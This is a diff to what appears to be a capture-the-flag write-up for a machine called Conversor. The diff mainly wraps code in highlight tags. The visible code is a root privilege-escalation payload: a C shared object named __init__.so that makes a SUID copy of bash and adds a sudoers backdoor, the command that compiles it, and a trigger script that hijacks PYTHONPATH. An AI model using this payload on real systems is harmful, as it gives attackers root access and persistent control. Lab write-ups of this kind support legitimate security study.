@@ -190,7 +190,7 @@ didn't use exploit
 
 
 -----------------------------
-
+{% highlight bash %}
 Payload 1: lib.c (The Root Payload)
 
 This is the C code for our malicious __init__.so file. We create this on our attacker machine.
@@ -209,9 +209,8 @@ void a() {
     /* Only run if we are root */
     if(geteuid() == 0) { 
         setuid(0);
-        setgid(0);
-        
-        /* The payload:
+        setgid(0); 
+       /* The payload:
            1. Copy the bash shell to /tmp/poc
            2. Make /tmp/poc a SUID binary (owned by root, runs as root)
            3. Add a sudoers rule as a backup persistence method
@@ -223,11 +222,11 @@ void a() {
         system(shell);
     }
 }
-
+{% endhighlight bash %}
 
 -----------------------------
 
-
+{% highlight bash %}
 Payload 2: Compiling the Payload
 
 The target is x86_64 Linux. We need to compile lib.c as a 64-bit shared object (.so) file.
@@ -235,8 +234,9 @@ The target is x86_64 Linux. We need to compile lib.c as a 64-bit shared object (
 ## On our Attacker Machine
 ## The PDF notes a cross-compiler, but if you're on 64-bit Kali/Parrot:
 gcc -shared -fPIC -o __init__.so lib.c
+{% endhighlight bash %}
 -----------------------------
-
+{% highlight bash %}
 Payload 3: runner.sh (The Trigger Script)
 
 This is the script we will run on the victim (Conversor) as the f****** user. It sets up the whole hijack.
@@ -265,7 +265,7 @@ while True:
 EOF
 
 cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
-
+{% endhighlight bash %}
 -----------------------------
 
 This payload will download __init__.so to the victim machine
